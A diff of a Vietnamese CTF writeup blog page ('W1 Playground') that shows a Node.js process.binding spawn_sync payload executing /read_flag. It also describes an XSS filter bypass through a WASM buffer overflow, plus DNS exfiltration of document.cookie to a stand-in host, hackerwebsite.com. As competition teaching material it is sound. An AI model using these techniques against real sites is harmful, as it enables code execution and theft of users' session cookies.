+    <span class="na">file</span><span class="p">:</span> <span class="dl">'</span><span class="s1">ls</span><span class="dl">'</span><span class="p">,</span>
+    <span class="na">args</span><span class="p">:</span> <span class="p">[</span><span class="dl">''</span><span class="p">],</span>
+    <span class="na">stdio</span><span class="p">:</span> <span class="p">[</span>
+        <span class="p">{</span> <span class="na">type</span><span class="p">:</span> <span class="dl">'</span><span class="s1">pipe</span><span class="dl">'</span><span class="p">,</span> <span class="na">readable</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="na">writable</span><span class="p">:</span> <span class="kc">false</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="na">type</span><span class="p">:</span> <span class="dl">'</span><span class="s1">pipe</span><span class="dl">'</span><span class="p">,</span> <span class="na">readable</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">writable</span><span class="p">:</span> <span class="kc">true</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="na">type</span><span class="p">:</span> <span class="dl">'</span><span class="s1">pipe</span><span class="dl">'</span><span class="p">,</span> <span class="na">readable</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">writable</span><span class="p">:</span> <span class="kc">true</span> <span class="p">}</span>
+  <span class="p">]}).</span><span class="nx">output</span><span class="p">.</span><span class="nf">toString</span><span class="p">()</span>
+</pre></td></tr></tbody></table></code></div></div>
+<p><a href="https://i.imgur.com/zswZKe6.png" class="popup img-link  shimmer"><img src="https://i.imgur.com/zswZKe6.png" alt="image" loading="lazy"></a></p>
 
-<p><a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/a01f55d0-ccc4-4603-a719-3f210ed010cb" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/a01f55d0-ccc4-4603-a719-3f210ed010cb" alt="image" loading="lazy"></a></p>
-<ul>
-  <li>Decode</li>
-</ul>
+<p>Ngon vậy là có thể thực hiện lệnh ls
+Để ý ở file Docker author đã tạo ra 1 file /read_flag để đọc flag vậy chúng ta thực thi file read_flag để nhận flag</p>
 
-<p><a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/f54894cb-1b7a-4c05-84fb-5239ac537d5e" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/f54894cb-1b7a-4c05-84fb-5239ac537d5e" alt="image" loading="lazy"></a></p>
+<p><a href="https://i.imgur.com/5EUqBt7.png" class="popup img-link  shimmer"><img src="https://i.imgur.com/5EUqBt7.png" alt="image" loading="lazy"></a></p>
 
-<ul>
-  <li>Flag: <strong>ASIS{good_job_bun}</strong></li>
-</ul>
+<p>Payload:</p>
+<div class="language-js highlighter-rouge"><div class="code-header">
+        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre>  <span class="nx">process</span><span class="p">.</span><span class="nf">binding</span><span class="p">(</span><span class="dl">'</span><span class="s1">spawn_sync</span><span class="dl">'</span><span class="p">).</span><span class="nf">spawn</span><span class="p">({</span> 
+    <span class="na">file</span><span class="p">:</span> <span class="dl">'</span><span class="s1">/read_flag</span><span class="dl">'</span><span class="p">,</span>
+    <span class="na">args</span><span class="p">:</span> <span class="p">[</span><span class="dl">''</span><span class="p">],</span>
+    <span class="na">stdio</span><span class="p">:</span> <span class="p">[</span>
+        <span class="p">{</span> <span class="na">type</span><span class="p">:</span> <span class="dl">'</span><span class="s1">pipe</span><span class="dl">'</span><span class="p">,</span> <span class="na">readable</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="na">writable</span><span class="p">:</span> <span class="kc">false</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="na">type</span><span class="p">:</span> <span class="dl">'</span><span class="s1">pipe</span><span class="dl">'</span><span class="p">,</span> <span class="na">readable</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">writable</span><span class="p">:</span> <span class="kc">true</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="na">type</span><span class="p">:</span> <span class="dl">'</span><span class="s1">pipe</span><span class="dl">'</span><span class="p">,</span> <span class="na">readable</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">writable</span><span class="p">:</span> <span class="kc">true</span> <span class="p">}</span>
+  <span class="p">]}).</span><span class="nx">output</span><span class="p">.</span><span class="nf">toString</span><span class="p">()</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p><a href="https://i.imgur.com/dKfBXot.png" class="popup img-link  shimmer"><img src="https://i.imgur.com/dKfBXot.png" alt="image" loading="lazy"></a></p>
+
+<p><strong>Flag: W1{REDACTED}</strong></p>
+
+<h2 id="bài-3-super-sanitizer"><span class="me-2">Bài 3: Super sanitizer</span><a href="#bài-3-super-sanitizer" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<p><a href="https://i.imgur.com/IZdGXnh.png" class="popup img-link  shimmer"><img src="https://i.imgur.com/IZdGXnh.png" alt="image" loading="lazy"></a></p>
+
+<p>Tóm tắt bài web này sử dụng WASM được compile từ C và sử dụng nó để xử lý input của user
+  File C nhận input của user và blacklist để xử lý nếu có ký tự blacklist thì ký tự đó sẽ bị xoá khỏi input của user</p>
+
+<p><a href="https://i.imgur.com/4gXTA7l.png" class="popup img-link  shimmer"><img src="https://i.imgur.com/4gXTA7l.png" alt="image" loading="lazy"></a></p>
+
+<p>Blacklist của bài này như sau <code class="language-plaintext highlighter-rouge">&lt;imgoner='\"'&gt;</code></p>
+
+<p>Lỗi của bài này nằm ở đây</p>
+
+<p><a href="https://i.imgur.com/zaOqpyM.png" class="popup img-link  shimmer"><img src="https://i.imgur.com/zaOqpyM.png" alt="image" loading="lazy"></a></p>
+
+<p>Khi chúng ta cho 1 ký tự có độ dài là <code class="language-plaintext highlighter-rouge">0x300</code> thì <code class="language-plaintext highlighter-rouge">raw_str[0x300]</code> sẽ bị tràn và sẽ ghi đè lên ký tự đầu tiên của blacklist là <code class="language-plaintext highlighter-rouge">\x00</code> từ đó blacklist sẽ trở thành rỗng -&gt; bypass filter</p>
+
+<p>Nhưng đến đây thì vẫn chưa xong, web có CSP để làm XSS khó hơn</p>
+
+<p>Sau một lúc fuzzing để kiểm tra thì dù CSP chặn redirect nhưng <code class="language-plaintext highlighter-rouge">window.location.href=hackerwebsite.com</code> vẫn resolve dns vậy ta có thể tận dụng cái này để leak flag do flag khá dài nên mình leak 2 lần để lấy flag (ví dụ <code class="language-plaintext highlighter-rouge">flag.hackerwebsite.com</code>)</p>
+
+<p>Nhưng leak kiểu gì? Mình đã thử leak kiểu <code class="language-plaintext highlighter-rouge">btoa(document.cookie)+".hackerwebsite.com"</code> nhưng khi leak thì vì lý do bảo mật dns query sẽ ngẫu nhiên uppercase hoặc lowercase các ký tự làm base64 bị lỗi nên nghĩ sang cách khác là <code class="language-plaintext highlighter-rouge">document.cookie.charCodeAt(0-&gt;document.cookie.length-1)</code> để leak ra từng ký tự của flag sang mã ascii</p>
+
+<p>Payload các bạn tự craft nhé</p>
+
+<p><a href="https://i.imgur.com/JhaUWFx.png" class="popup img-link  shimmer"><img src="https://i.imgur.com/JhaUWFx.png" alt="image" loading="lazy"></a></p>
+
+<p><strong>Flag: W1{REACTED}</strong></p>
 
 
   </div>
@@ -1519,6 +1951,36 @@
     
 
     <!-- tags -->
+    
+      <div class="post-tags">
+        <i class="fa fa-tags fa-fw me-1"></i>
+        
+          <a
+            href="/tags/prototype-pollution/"
+            class="post-tag no-text-decoration"
+          >Prototype Pollution</a>
+        
+          <a
+            href="/tags/ssti/"
+            class="post-tag no-text-decoration"
+          >SSTI</a>
+        
+          <a
+            href="/tags/api-testing/"
+            class="post-tag no-text-decoration"
+          >API testing</a>
+        
+          <a
+            href="/tags/xss/"
+            class="post-tag no-text-decoration"
+          >XSS</a>
+        
+          <a
+            href="/tags/php/"
+            class="post-tag no-text-decoration"
+          >PHP</a>
+        
+      </div>
     
 
     <div
@@ -1552,21 +2014,21 @@
 
       
 
-      <a href="https://twitter.com/intent/tweet?text=Asis%20CTF%202023%20Writeup%20-%20Yuu's%20blog&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FAsisCTF%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
+      <a href="https://twitter.com/intent/tweet?text=W1%20Playground%20Writeup%20-%20Yuu's%20blog&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FW1Playground%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
         <i class="fa-fw fa-brands fa-square-x-twitter"></i>
       </a>
     
 
       
 
-      <a href="https://www.facebook.com/sharer/sharer.php?title=Asis%20CTF%202023%20Writeup%20-%20Yuu's%20blog&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FAsisCTF%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
+      <a href="https://www.facebook.com/sharer/sharer.php?title=W1%20Playground%20Writeup%20-%20Yuu's%20blog&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FW1Playground%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
         <i class="fa-fw fab fa-facebook-square"></i>
       </a>
     
 
       
 
-      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FAsisCTF%2F&text=Asis%20CTF%202023%20Writeup%20-%20Yuu's%20blog" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
+      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FW1Playground%2F&text=W1%20Playground%20Writeup%20-%20Yuu's%20blog" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
         <i class="fa-fw fab fa-telegram"></i>
       </a>
     
@@ -2109,6 +2571,11 @@
 
 
 
+  <section id="toc-wrapper" class="ps-0 pe-4">
+    <h2 class="panel-heading ps-3 pt-2 mb-2">Contents</h2>
+    <nav id="toc"></nav>
+  </section>
+
 
             
           </aside>
@@ -2181,55 +2648,55 @@
   
 
   
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
     
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
 
 
 
@@ -2278,6 +2745,37 @@ Bài 1 Warmup PHP:
         </article>
       
         <article class="col">
+          <a href="/posts/AsisCTF/" class="post-preview card h-100">
+            <div class="card-body">
+              <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1695571200"
+  data-df="ll"
+  
+>
+  Sep 24, 2023
+</time>
+
+              <h4 class="pt-0 my-2">Asis CTF 2023 Writeup</h4>
+              <div class="text-muted">
+                <p>Asis-CTF-2023-Writeup
+Bài 1 hello:
+
+  Tóm tắt đề thì đại khái là đề bảo chúng ta phải request một cái method get có parameter là x lên Web sao cho không có chữ next và chữ file là được, nhưng mà mu...</p>
+              </div>
+            </div>
+          </a>
+        </article>
+      
+        <article class="col">
           <a href="/posts/PicoCTF2024/" class="post-preview card h-100">
             <div class="card-body">
               <!--
@@ -2305,45 +2803,6 @@ Bài 1 Warmup PHP:
           </a>
         </article>
       
-        <article class="col">
-          <a href="/posts/GreyCTF/" class="post-preview card h-100">
-            <div class="card-body">
-              <!--
-  Date format snippet
-  See: ${JS_ROOT}/utils/locale-dateime.js
--->
-
-
-
-
-<time
-  
-  data-ts="1713715200"
-  data-df="ll"
-  
->
-  Apr 21, 2024
-</time>
-
-              <h4 class="pt-0 my-2">GreyCTF 2024</h4>
-              <div class="text-muted">
-                <p>No Sql Injection
-1
-2
-3
-4
-5
-6
-I asked My friend Jason to build me a new e-commerce website. We just finished the login system and there&#39;s already bugs 🤦
-
-Author: jro
-
-http://challs.nusgreyhats.org:3...</p>
-              </div>
-            </div>
-          </a>
-        </article>
-      
     </nav>
   </aside>
   <!-- #related-posts -->
@@ -2358,18 +2817,22 @@ http://challs.nusgreyhats.org:3...</p>
   
 
   
-    <div class="btn btn-outline-primary disabled" aria-label="Older">
-      <p>-</p>
-    </div>
+    <a
+      href="/posts/GreyCTF/"
+      class="btn btn-outline-primary"
+      aria-label="Older"
+    >
+      <p>GreyCTF 2024</p>
+    </a>
   
 
   
     <a
-      href="/posts/Wannagame-Freshman/"
+      href="/posts/KCSCCTF/"
       class="btn btn-outline-primary"
       aria-label="Newer"
     >
-      <p>Wannagame Freshman CTF writeup</p>
+      <p>KCSC 2024</p>
     </a>
   
 </nav>
@@ -3017,9 +3480,16 @@ http://challs.nusgreyhats.org:3...</p>
 
   
 
+  
+    
+
+    
+
+  
 
 
-  <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.1/dist/jquery.min.js,npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.10/dayjs.min.js,npm/dayjs@1.11.10/locale/en.min.js,npm/dayjs@1.11.10/plugin/relativeTime.min.js,npm/dayjs@1.11.10/plugin/localizedFormat.min.js"></script>
+
+  <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.1/dist/jquery.min.js,npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.10/dayjs.min.js,npm/dayjs@1.11.10/locale/en.min.js,npm/dayjs@1.11.10/plugin/relativeTime.min.js,npm/dayjs@1.11.10/plugin/localizedFormat.min.js,npm/tocbot@4.25.0/dist/tocbot.min.js"></script>
 
 
 
